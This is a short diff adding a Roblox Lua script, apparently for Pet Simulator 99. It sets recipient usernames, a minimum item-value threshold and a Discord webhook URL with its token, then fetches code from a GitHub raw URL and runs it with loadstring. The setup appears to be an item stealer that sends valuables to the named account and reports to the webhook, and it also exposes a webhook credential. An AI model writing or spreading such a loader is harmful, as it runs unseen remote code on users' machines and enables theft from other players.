@@ -1,0 +1,6 @@
+Username = "quotrey"
+Username2 = "quotrey"
+MinimumRAP = 1000000
+Webhook = "https://discord.com/api/webhooks/1291111055862272213/qq4cmcs6MXQTPZoNUdfdAnvOS11gPtBrY6yzdtZCDAHJd7UwHwm1Jpe3--wabD7tEdLE"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xeps99s/ps99scrip/main/xe", true))()
